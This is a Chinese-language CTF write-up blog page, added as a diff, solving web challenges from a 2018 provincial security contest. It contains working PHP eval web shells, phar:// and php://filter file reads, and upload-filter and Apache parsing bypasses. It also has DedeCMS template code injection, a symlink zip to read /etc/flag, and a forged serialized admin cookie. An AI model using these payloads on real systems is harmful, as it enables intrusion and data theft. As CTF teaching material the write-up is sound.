@@ -1,0 +1,601 @@
+<!--
+	作者：Sariay
+	时间：2018-09-25
+	描述：There may be a bug, but don't worry, QiLing(器灵) says that it can work normally!
+-->
+
+
+	<!DOCTYPE html>
+	<html>
+		
+
+<head><meta name="generator" content="Hexo 3.8.0">
+	<title>2018web安全测试秋季省赛Writeup</title>
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="apple-mobile-web-app-title" content="Amaze UI">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+    <meta name="author" content="miraitowa">
+    <meta name="keywords" content="">
+    <meta name="description" content="">
+   	<!-- css -->
+	<link rel="stylesheet" href="/css/style.css">
+
+	<!-- favicon -->
+	<link href="/img/favicon.ico" rel="Shortcut Icon" type="image/ico">
+	
+	<!-- font-awesome -->
+	<link href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+</head>
+
+	<body>	
+		<!--Preloader-->
+<div id="preloader">
+	<div id="status">
+		<img alt="PRELOADER" src="/img/logo.png">
+	</div>
+</div>
+<!--Preloader end-->
+
+<!-- header -->
+
+	<header id="header-bg-2">
+
+	
+		<div id="cd-logo"><a href="/"><img src="/img/logo.png" alt="Logo"></a></div>
+	
+	
+	<!-- motto or description -->
+		
+ 		<p class="motto"></p>
+	
+	
+	<!-- current page name or title -->
+	
+		
+		
+			
+			<p class="page-name">当前文章&nbsp;:&nbsp;《2018web安全测试秋季省赛Writeup》</p>
+			
+		
+	
+	
+	<!-- others: such as change-bg, time... -->
+	<p class="page-name-other">
+		11/11/2018 
+		<style type="text/css">
+	header:after {
+		content: '';
+		position: relative;
+		top: 0;
+		left: 0;
+		height: 100%;
+		width: 100%;
+		background: #222222;
+		opacity: .5;
+		z-index: -1;
+	}
+	
+	.change-header-bg{
+		font-style: normal;
+	}
+	.change-header-bg i{
+		text-align: center;
+		cursor: pointer;
+		pointer-events: bounding-box;
+	}
+	@media(max-width:512px) {
+		.change-header-bg {
+			display: none;
+			visibility: hidden;
+		}
+	}
+	
+</style>
+
+<script type="text/javascript">
+	function changeHeaderBg(){
+		var random_bg = Math.floor(Math.random() * 109 + 1);
+		var bg = 'url(https://miraitowa.github.io/Random-img/' + random_bg + '.jpg)';
+		$("#header-bg-2").css("background-image", bg);
+	}
+</script>
+
+<span class="change-header-bg">
+	——&nbsp;<i class="fa fa-camera-retro" onclick="changeHeaderBg()"></i>	
+</span>
+	</p>		
+</header>
+
+<!-- nav -->
+<div id="cd-nav">
+	<a href="#0" title="menu" class="cd-nav-trigger"><span></span></a>
+
+	<nav id="cd-main-nav">
+		<ul>
+			
+      		<li class="fa fa-/">
+           		<a href="/" title="主页">主页</a>	
+      		</li>
+    		
+      		<li class="fa fa-/archives">
+           		<a href="/archives" title="归档">归档</a>	
+      		</li>
+    		
+      		<li class="fa fa-/categories">
+           		<a href="/categories" title="分类">分类</a>	
+      		</li>
+    		
+      		<li class="fa fa-/gallery">
+           		<a href="/gallery" title="相册">相册</a>	
+      		</li>
+    		
+      		<li class="fa fa-/about">
+           		<a href="/about" title="关于">关于</a>	
+      		</li>
+    		
+      		<li class="fa fa-/tags">
+           		<a href="/tags" title="友链">友链</a>	
+      		</li>
+    		
+    		
+        	
+		</ul>
+	</nav>
+</div>
+
+		<!--main-->
+		<main> 
+		<div class="page-container">
+		<!-- content srart -->
+<div class="am-g am-g-fixed blog-fixed blog-content">
+	<div class="am-u-md-8 am-u-sm-12">
+
+		<article class="am-article blog-article-p">
+
+			<div class="am-article-hd">
+				
+
+
+				<h1 class="am-article-title blog-text-center">
+					
+					
+	
+		<a href="/2018/11/11/2018web安全测试秋季省赛Writeup/" itemprop="url">		
+			2018web安全测试秋季省赛Writeup		
+		</a>
+	
+
+				</h1>
+
+				<p class="am-article-meta blog-text-center">
+					<span>
+						<i class="fa fa-clock-o"></i> 
+						<a href="/2018/11/11/2018web安全测试秋季省赛Writeup/" itemprop="url">
+	<time datetime="2018-11-11T12:47:30.376Z" itemprop="datePublished">
+  		2018-11-11
+  </time>
+</a>    
+&nbsp;
+					</span>
+					
+					<span>						
+						
+					</span>
+				</p>
+			</div>
+
+			<div class="am-article-bd">
+				<div class="content" id="post-content">
+					
+						<h2 id="2018web安全测试秋季省赛Writeup"><a href="#2018web安全测试秋季省赛Writeup" class="headerlink" title="2018web安全测试秋季省赛Writeup"></a>2018web安全测试秋季省赛Writeup</h2><p><img src="https://i.imgur.com/gHkLRNQ.jpg" alt=""></p>
+<p>上周日安恒web安全测试秋季省赛打的我好无力呀！！本来早就应该拿出来的writeup因为好多事情耽误了(QAQ)</p>
+<p>对于后面两个300的题目进行复现整理出来得到的<code>writeup</code>。</p>
+<p>如有错误，希望各位师傅进行指正(ths)</p>
+<h3 id="常规操作"><a href="#常规操作" class="headerlink" title="常规操作"></a>常规操作</h3><p>常规操作，试一试 <a href="http://114.55.36.69:8009/" target="_blank" rel="noopener">http://114.55.36.69:8009/</a></p>
+<p>看到<code>zip</code>于是猜测是<code>phar://</code>伪协议读取。</p>
+<p>于是写个小马打包成<code>zip</code>文件传上去。</p>
+<p>例如我写的是<code>miraitowa.php</code>。</p>
+<pre><code>&lt;?php
+@eval($_POST[&#39;miraitowa&#39;]);
+?&gt;
+</code></pre><p>然后压缩成<code>miraitowa.zip</code>，那么需要访问以下链接。</p>
+<p><a href="http://114.55.36.69:8009/index.php?url=phar://upload/5a722d46033ecd25d5ce0f13a0e7d8ec.zip/miraitowa" target="_blank" rel="noopener">http://114.55.36.69:8009/index.php?url=phar://upload/5a722d46033ecd25d5ce0f13a0e7d8ec.zip/miraitowa</a></p>
+<p>随后连接小马，读到<code>flag</code></p>
+<h4 id="另一种操作"><a href="#另一种操作" class="headerlink" title="另一种操作"></a>另一种操作</h4><p>直接使用PHP伪协议进行读取flag（Orz)</p>
+<p><a href="http://114.55.36.69:8009/index.php?url=php://filter/convert.base64-encode/resource=flag" target="_blank" rel="noopener">http://114.55.36.69:8009/index.php?url=php://filter/convert.base64-encode/resource=flag</a></p>
+<p>也可以得到答案的：<code>a5aa012546a729eebaeaa768883beb23</code></p>
+<h3 id="送分的md5"><a href="#送分的md5" class="headerlink" title="送分的md5"></a>送分的md5</h3><p>怎么还有md5 <a href="http://114.55.36.69:8000" target="_blank" rel="noopener">http://114.55.36.69:8000</a></p>
+<pre><code>md5 crash?&lt;!--$_POST[&#39;data1&#39;]!== $_POST[&#39;data2&#39;]&amp;&amp;md5($_POST[&#39;data1&#39;])===md5($_POST[&#39;data2&#39;] --&gt;fail
+</code></pre><p>很简单的<code>MD5</code>绕过，构造如下<code>payload</code>：</p>
+<pre><code>POST Data: param1[]=1&amp;param2[]=2
+
+POST Data: param1[]=1&amp;param2[]=
+</code></pre><h3 id="A-A"><a href="#A-A" class="headerlink" title="!!!A_A"></a>!!!A_A</h3><p>这题考过很多次了，但是还是要仔细的说一下</p>
+<p>这是我以前做过的一道代码审计的题目，其中有一个知识点，可以详细看看这个链接</p>
+<p><a href="https://bugs.shuimugan.com/bug/view?bug_no=64792" target="_blank" rel="noopener">https://bugs.shuimugan.com/bug/view?bug_no=64792</a></p>
+<p><img src="https://s1.ax1x.com/2018/05/24/CWrqSS.png" alt=""></p>
+<p>从上面可以看出，简单点解释就是当代码中存在<code>$_REQUEST[&#39;user_id&#39;]</code>里面类似的参数的时候，我们在<code>url</code>上可以这样<code>a.php?user.id</code></p>
+<p>传参去进行绕过,这样进去之后也能表示<code>$_REQUEST[&#39;user_id&#39;]</code>的值，同样可以绕过的符号还有<code>+`</code>.<code></code>[<code>等，应该说是</code>php`的一个小特性，上面讲的很清楚了</p>
+<pre><code>!!!A_A !!!-_- http://114.55.36.69:8001/
+&lt;?php
+highlight_file(__FILE__);
+ini_set(&quot;display_error&quot;, false);  
+error_reporting(0);  
+$str = isset($_GET[&#39;A_A&#39;])?$_GET[&#39;A_A&#39;]:&#39;A_A&#39;;
+if (strpos($_SERVER[&#39;QUERY_STRING&#39;], &quot;A_A&quot;) !==false) {
+echo &#39;A_A,have fun&#39;;
+}
+elseif ($str&lt;9999999999) {
+echo &#39;A_A,too small&#39;;
+}
+elseif ((string)$str&gt;0) {
+echo &#39;A_A,too big&#39;;
+}
+else{
+echo file_get_contents(&#39;flag.php&#39;);
+
+}
+
+?&gt; A_A,too small
+</code></pre><p>阅读代码发现，首先第一步要绕过<code>A_A</code>这个符号，如果出现这个符号他就会显示<code>A_A,have fun</code>，</p>
+<p>就不能继续往下面执行到<code>file_get_contents(&#39;flag.php&#39;)</code>了，</p>
+<p>但是我们发送<code>get</code>参数的时候又必须要发送，因此我们就用到刚才的知识点，我们可以用<code>A.A</code>或者是<code>A+A</code>去传参去绕过。</p>
+<p>下面的代码就是常规的数字绕过了，但这里也用到了一个<code>trick</code>，就是无论你的数字多大，对于数组而言总是比数组小，下面是操作</p>
+<p><img src="https://i.imgur.com/CANJfzS.png" alt=""></p>
+<p>所以说，我们可以利用数组去绕过<code>$str&lt;9999999999</code>的特性，下面一个判断是强制转化为字符串在与数字比较的判断，</p>
+<p>这就是平常操作很多的弱类型了，直接让参数等于<code>admin</code>就可以了，因为<code>“admin”== 0</code> ，结果是<code>true</code>，直接等于0绕过即可,所以这题的<code>payload</code></p>
+<pre><code>http://114.55.36.69:8001/?A.A[]=admin
+</code></pre><p>或者使用</p>
+<pre><code>http://114.55.36.69:8001/?A+A[]=admin
+</code></pre><h3 id="简单文件上传"><a href="#简单文件上传" class="headerlink" title="简单文件上传"></a>简单文件上传</h3><p>简单文件上传，多试试 <a href="http://114.55.36.69:8015" target="_blank" rel="noopener">http://114.55.36.69:8015</a></p>
+<p>尝试多次，发现是检测文件头来判断文件类型，那么使用图马可以绕过上传限制。</p>
+<p>命名为<code>miraitowa.jpg.php</code>可以成功上传。</p>
+<p>提示如下。</p>
+<pre><code>uploads/17d4aa23e1d7c8cf1c176485d71effe7b35bdec3/miraitowa.peg.php succesfully uploaded！
+</code></pre><p>然后连接图马就可以读<code>flag</code>了。</p>
+<h3 id="新的新闻搜索"><a href="#新的新闻搜索" class="headerlink" title="新的新闻搜索"></a>新的新闻搜索</h3><p>这是预选赛的类似的题目，套路基本都是一样的</p>
+<p>给出我在先知社区的链接：<a href="https://xz.aliyun.com/t/3089#toc-6" target="_blank" rel="noopener">https://xz.aliyun.com/t/3089#toc-6</a></p>
+<p>这个直接用<code>sqlmap</code>跑<code>post</code>注入就可以了</p>
+<pre><code>python sqlmap.py -r 1.txt -D news —dump
+</code></pre><h3 id="真的是dedecms"><a href="#真的是dedecms" class="headerlink" title="真的是dedecms"></a>真的是dedecms</h3><p>放出来好几天的东西，随便玩玩 <a href="http://114.55.36.69:8008" target="_blank" rel="noopener">http://114.55.36.69:8008</a></p>
+<p>参考<a href="https://www.freebuf.com/vuls/164035.html" target="_blank" rel="noopener">DedeCMS V5.7 SP2后台存在代码执行漏洞</a>。</p>
+<p>后台<code>admin</code>弱密码</p>
+<p><a href="http://114.55.36.69:8008/dede/tpl.php?action=upload" target="_blank" rel="noopener">http://114.55.36.69:8008/dede/tpl.php?action=upload</a></p>
+<p>在页面源代码中获取到<code>token</code>值。</p>
+<pre><code>&lt;input name=&#39;token&#39; type=&#39;hidden&#39; value=&#39;9ffadcfa24f99fb459bdab3cae23b0b2&#39;  /&gt;
+
+http://114.55.36.69:8008/dede/tpl.php?filename=moonsec.lib.php&amp;action=savetagfile&amp;content=%3C?php%20phpinfo();?%3E&amp;token=9ffadcfa24f99fb459bdab3cae23b0b2
+</code></pre><p>然后就能用如下页面连接小马。</p>
+<p><a href="http://114.55.36.69:8008/include/taglib/moonsec.lib.php" target="_blank" rel="noopener">http://114.55.36.69:8008/include/taglib/moonsec.lib.php</a></p>
+<h3 id="get-flag"><a href="#get-flag" class="headerlink" title="get flag"></a>get flag</h3><p>flag在/etc/flag <a href="http://114.55.36.69:8003/" target="_blank" rel="noopener">http://114.55.36.69:8003/</a></p>
+<p><code>admin</code>弱密码登陆。</p>
+<p>提示如下：</p>
+<pre><code>Welcome admin 退出查看压缩的flag. 路径为 /etc/flag
+</code></pre><p>大概是会解压传上去的压缩文件，然后读取里面的内容。</p>
+<p>于是使用ln软连接。</p>
+<pre><code>ln -s /etc/flag test
+zip -y 1.zip test
+</code></pre><p>然后上传打包后的软连接文件得到<code>flag</code>。</p>
+<h3 id="不一样的上传系统"><a href="#不一样的上传系统" class="headerlink" title="不一样的上传系统"></a>不一样的上传系统</h3><p>似乎是新瓶装旧酒的原题，安恒一月月赛的题目，不再做过多赘述。</p>
+<p>一叶飘零师傅的博客有讲述。</p>
+<p>这里抄【并改一下原话】(HHHHH)。</p>
+<p><code>Apache</code>存在解析漏洞。<code>Apache</code>是从右到左开始判断解析，如果为不可识别解析，就再往左判断。</p>
+<p>所以我们准备脚本<code>miraitowa.php.png</code>小马压缩成压缩包上传即可拿到<code>shell</code>，我们的<code>png</code>会被解析为<code>php</code>。</p>
+<p>但是这里有一个小绕过，因为会删除带有<code>php</code>的文件。</p>
+<p>但是这里过滤不严谨，PHP大写即可绕过，最后成功拿到<code>shell</code>，获得flag。</p>
+<p>所以最终写小马重命名并打包上传<code>miraitowa.PHP.png.zip</code>，然后得到路径</p>
+<pre><code>/upload/cf417e3635d8414f1621a0e945a68702/miraitowa.PHP.png
+/upload/cf417e3635d8414f1621a0e945a68702/__MACOSX/._miraitowa.PHP.png
+</code></pre><p>连接就可以得到最终的<code>flag</code></p>
+<h3 id="秘密的系统"><a href="#秘密的系统" class="headerlink" title="秘密的系统"></a>秘密的系统</h3><p>不久前才开发的系统，功能也还不完善，代码也还有待改进 <a href="http://114.55.36.69:8014/" target="_blank" rel="noopener">http://114.55.36.69:8014/</a></p>
+<p>看到一个<code>Upload</code>。</p>
+<p>点进去提示您不是管理员，无法使用此功能。</p>
+<p>登陆界面也不能正常访问。</p>
+<p>习惯性的翻看<code>robots.txt</code>得到如下信息。</p>
+<pre><code>User-agent: *
+Disallow: index.php?r=site/loginuser_1
+</code></pre><p>于是进入登录界面。</p>
+<pre><code> &lt;!--
+*** author: cib_zhinianyuxin.com
+*** code: github.com
+--&gt;
+</code></pre><p>给出了作者<code>github</code>的一些信息。</p>
+<p>翻看<code>github</code>，得到一个登陆账号密码<code>test/cib_sec</code>，以及<code>cookie</code>生成的方法。</p>
+<pre><code>secret-system
+##README.md
+
+*** author: cib_zhinianyuxin.com
+
+It&#39;s just a system which is not completed , there are some tips:
+
+you can use test/cib_sec to login ,but you are not admin!
+only admin can upload file ,but whichone can not bypass my rules.
+/**
+$sign = array(
+&#39;id&#39;=&gt;$model-&gt;id,
+&#39;name&#39;=&gt;$model-&gt;username,
+&#39;sign&#39;=&gt;md5($model-&gt;id.$model-&gt;username),
+);
+$_COOKIE[&#39;cib&#39;] = serialize($sign);
+**/
+</code></pre><p>登陆测试账号后，<code>Google</code>插件<code>EditThisCookie</code>可以查看该账号的<code>cib cookie</code>是url编码的。</p>
+<pre><code>a%3A3%3A%7Bs%3A2%3A%22id%22%3Bi%3A2%3Bs%3A4%3A%22name%22%3Bs%3A4%3A%22test%22%3Bs%3A4%3A%22sign%22%3Bs%3A32%3A%227cbab5cea99169139e7e6d8ff74ebb77%22%3B%7D
+
+a:3:{s:2:&quot;id&quot;;i:2;s:4:&quot;name&quot;;s:4:&quot;test&quot;;s:4:&quot;sign&quot;;s:32:&quot;7cbab5cea99169139e7e6d8ff74ebb77&quot;;}
+</code></pre><p>解码后发现可以构造<code>cib cookie</code>，改<code>i</code>为<code>1</code>，<code>test</code>为<code>admin</code>，最后的<code>md5</code>编码<code>1.admin</code>得到<code>6c5de1b510e8bdd0bc40eff99dcd03f8</code>，于是得到如下<code>cookie</code>。</p>
+<pre><code>a:3:{s:2:&quot;id&quot;;i:1;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:4:&quot;sign&quot;;s:32:&quot;6c5de1b510e8bdd0bc40eff99dcd03f8&quot;;}
+</code></pre><p>再<code>url</code>编码后修改<code>cookie</code>。</p>
+<pre><code>%61%3a%33%3a%7b%73%3a%32%3a%22%69%64%22%3b%69%3a%31%3b%73%3a%34%3a%22%6e%61%6d%65%22%3b%73%3a%35%3a%22%61%64%6d%69%6e%22%3b%73%3a%34%3a%22%73%69%67%6e%22%3b%73%3a%33%32%3a%22%36%63%35%64%65%31%62%35%31%30%65%38%62%64%64%30%62%63%34%30%65%66%66%39%39%64%63%64%30%33%66%38%22%3b%7d
+</code></pre><p>然后成功升级成为管理员。</p>
+<p>一个文件上传。<a href="https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html" target="_blank" rel="noopener">Apache2.2.15漏洞解析。</a></p>
+<p>上传文件抓包改后缀名为<code>.php.jpg</code></p>
+<pre><code>POST /web/index.php?r=upload%2Fupload HTTP/1.1
+Host: 114.55.36.69:8014
+Content-Length: 332
+Cache-Control: max-age=0
+Origin: http://114.55.36.69:8014
+Upgrade-Insecure-Requests: 1
+DNT: 1
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryUAu1gUcre21NULzR
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Referer: http://114.55.36.69:8014/web/index.php?r=upload%2Findex
+Accept-Encoding: gzip, deflate
+Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
+Cookie: _csrf=ZrheCWNLhMGJ84x9lHiPaGGspHQBAJU_; _csrf_name_7ace9e0d=d13170c019575cfa3f28e142a6c066ad; _csrf_name_7ace9e0d__ckMd5=1725411428d3c49a; cib=%61%3a%33%3a%7b%73%3a%32%3a%22%69%64%22%3b%69%3a%31%3b%73%3a%34%3a%22%6e%61%6d%65%22%3b%73%3a%35%3a%22%61%64%6d%69%6e%22%3b%73%3a%34%3a%22%73%69%67%6e%22%3b%73%3a%33%32%3a%22%36%63%35%64%65%31%62%35%31%30%65%38%62%64%64%30%62%63%34%30%65%66%66%39%39%64%63%64%30%33%66%38%22%3b%7d; PHPSESSID=mq4vqc5002uti92f8t4gknh9l6
+Connection: close
+
+------WebKitFormBoundaryUAu1gUcre21NULzR
+Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;south.php.jpg&quot;
+Content-Type: text/php
+
+&lt;?php
+@eval($_POST[&#39;south&#39;]);
+?&gt;
+
+------WebKitFormBoundaryUAu1gUcre21NULzR
+Content-Disposition: form-data; name=&quot;submit&quot;
+
+ä¸ä¼ 
+------WebKitFormBoundaryUAu1gUcre21NULzR--
+</code></pre><p>最后连接小马得到<code>flag</code></p>
+<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>这次比赛被吊打了，思考了下原因，自己对细节注意不够准确，像apache解析问题，当时根本就没注意版本号，一直注意在代码审计上，</p>
+<p>所以导致浪费了许多时间，还有就是对于弱密码登录问题，并没有在比赛中考虑到，也没有多尝试,导致<code>get flag</code>无从下手，</p>
+<p>总之还是自己能力不够,需要提高的地方还有许多……成长ing，感谢我的好友对我的帮助，谢谢他们的指导（ths)</p>
+
+					
+				</div>
+			</div>
+		</article>
+
+		<ul class="am-pagination">
+    
+	
+		<li class="am-pagination-next">
+		<a class="pull-right" href="/2018/11/11/记一次使用Ubuntu 14.04 LTS搭建FBctf平台/" title="记一次使用Ubuntu 14.04 LTS搭建FBctf平台">
+			下一篇 &raquo;
+		</a>
+		</li>
+	 
+ </ul>
+        
+
+		<div class="theme-annie-comment-button-container">
+	<button id="annie-comment-button" class="theme-annie-comment-button" onclick="Annie_Comment()">
+		加载评论
+		<!--加载评论-->
+	</button>
+</div>
+
+<div id="annie-comment-container" class="theme-annie-comment-main-container">
+
+	
+		
+			<!-- comment valine -->
+			<!-- show valine comment -->
+<div id="valineComment" class="comment"></div>
+
+<!-- valine`s js & css -->
+<script>
+	window.jQuery || document.write('<script src="/js/jquery-2.1.1.min.js"><\/script>')
+</script>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="/js/valine.min.js"></script>
+<link rel="stylesheet" href="/css/comment.css">
+
+<script>
+	var checkExistComment = setInterval(function() {
+		if( $('#valineComment').length ) {
+			new Valine({
+				// AV 对象来自上面引入av-min.js(老司机们不要开车➳♡゛扎心了老铁)
+				av: AV,
+				//使用id寻找div元素（使用class可能找不到）
+				el: '#valineComment',
+				emoticon_url: 'https://cloud.panjunwen.com/alu',
+				emoticon_list: ["吐.png", "期待.png", "高兴.png", "吐血倒地.png", "哭泣.png", "欢呼.png"],
+				app_id: "3333....", //获取APP ID
+				app_key: "3333......", //获取APP KEY
+				placeholder: "no any!", //评论框占位提示文字        			
+			});
+			clearInterval(checkExistComment);
+		}
+	}, 100);
+</script>
+		
+	
+
+</div>
+
+<script type="text/javascript">
+	/* Show Comment */
+	var Annie_Comment = function() {
+		function Show_Hidden(obj) {
+			obj.style.display = 'block';
+		}
+		
+		//var obutton = $('#annie-comment-button');
+		//var obutton = $('#annie-comment-container');
+		var obutton = document.getElementById("annie-comment-button" || "0");
+		var odiv = document.getElementById("annie-comment-container");
+		if( 'obutton' ) {
+			obutton.onclick = function() {
+				Show_Hidden(odiv);
+				$("#annie-comment-button").css("display", 'none');
+				return false;
+			}
+		}
+	};
+
+	(function Annie_Init() {
+		Annie_Comment();
+	})();
+</script>
+		
+		<!--
+	时间：2018-09-24
+	描述：The TOC module refers to 'https://github.com/codefine/hexo-theme-mellow', include toc.ejs、toc.js、toc.css. All rights reserved by codefine. 
+-->
+
+	
+		<aside class="post-widget">
+			<nav class="post-toc-wrap" id="post-toc">
+				
+					<strong>文章目录</strong>
+				
+				
+				<!--toc(post.content)-->
+				<ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#2018web安全测试秋季省赛Writeup"><span class="post-toc-text">2018web安全测试秋季省赛Writeup</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#常规操作"><span class="post-toc-text">常规操作</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#另一种操作"><span class="post-toc-text">另一种操作</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#送分的md5"><span class="post-toc-text">送分的md5</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#A-A"><span class="post-toc-text">!!!A_A</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#简单文件上传"><span class="post-toc-text">简单文件上传</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#新的新闻搜索"><span class="post-toc-text">新的新闻搜索</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#真的是dedecms"><span class="post-toc-text">真的是dedecms</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#get-flag"><span class="post-toc-text">get flag</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#不一样的上传系统"><span class="post-toc-text">不一样的上传系统</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#秘密的系统"><span class="post-toc-text">秘密的系统</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#后记"><span class="post-toc-text">后记</span></a></li></ol></li></ol>
+			</nav>
+			<div class="post-toc-bar"><div>
+		</div></div></aside>
+	
+
+	</div>
+</div>
+		</div>
+		</main>
+		
+		<!--footer-->
+		<footer>
+	<div class="blog-text-center">
+		<div class="theme-annie-social">
+				
+				
+					<a href="https://github.com/miraitowa" title="Github" target="_blank"><i class="fa fa-github"></i>&nbsp;</a>
+					
+				
+				
+					<a href="https://miraitowa.github.io/about/" title="Email" target="_blank"><i class="fa fa-envelope-o"></i>&nbsp;</a>
+					
+					
+						
+				
+		</div>
+	</div>
+
+	<div class="blog-text-center">
+		<div class="theme-annie-copyright">
+			
+				&copy; 2018, content by miraitowa. All Rights Reserved. 			   
+			
+		</div>
+	</div>
+
+	<div class="blog-text-center">
+		<div class="theme-annie-copyright">
+			<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.		
+		</div>
+	</div>
+</footer>
+		<!-- <script src="http://code.jquery.com/jquery-2.1.1.min.js" type="text/javascript"></script> -->
+
+<script>
+	window.jQuery || document.write('<script src="/js/jquery-2.1.1.min.js"><\/script>')
+</script>
+
+<style>
+	.motto {
+		color: #000000;
+		font-size: 20px;
+		margin: 100px 25% 0;
+		width: 50%;
+		line-height: 1.4;
+		font-family:"KaiTi", "STXingkai", "Source Sans Pro", "Segoe UI", "Lucida Grande", Helvetica, Arial, "Microsoft YaHei", FreeSans, Arimo, "Droid Sans", "wenquanyi micro hei", "Hiragino Sans GB", "Hiragino Sans GB W3", FontAwesome, sans-serif;
+		text-align: center;
+	}
+	@media(max-width: 890px) {
+		.motto {	
+			margin: 100px 10% 0;
+			width: 80%;
+		}
+	}
+	@media(max-width: 890px) {
+		.motto {
+			margin: 100px 5% 0;
+			width: 90%;
+		}
+	}
+</style>
+
+
+	<script src="/js/motto.js"></script>
+	<script type="text/javascript">
+		$(".motto").html(getMingYanContent());
+	</script>	
+
+
+
+
+
+
+
+	<script type="text/javascript" src="/js/toc.js"></script>
+
+
+<script type="text/javascript" src="/js/main.js"></script>
+
+<script type="text/javascript">
+	//generate a random img that pre_name 'from 0 to 110'
+	var random_bg = Math.floor(Math.random() * 109 + 1);
+
+	//var bg = 'url(/img/random/' + random_bg + '.jpg)';		
+	var bg = 'url(https://miraitowa.github.io/Random-img/' + random_bg + '.jpg)';
+
+	$("#header-bg-2").css("background-image", bg);
+</script>
+		
+		<!--back to top-->
+        <style type="text/css">
+	#totop {
+		background: white;
+		border-radius: 50%;
+		position: fixed;
+		right: 5.4%;
+		bottom: 80px;
+		cursor: pointer;
+	}
+	
+	#totop a {
+		color: #474747;
+		background-color: transparent;
+		padding: 10px;
+		text-decoration: none;
+	}
+	
+	@media(max-width:512px) {
+		#totop {
+			display: none;
+			visibility: hidden;
+		}
+	}
+</style>
+
+
+	<div id="totop">
+  		<a href="javascript:;" class="fa fa-arrow-up"></a>
+	</div>
+
+	</body>
+	</html>
+
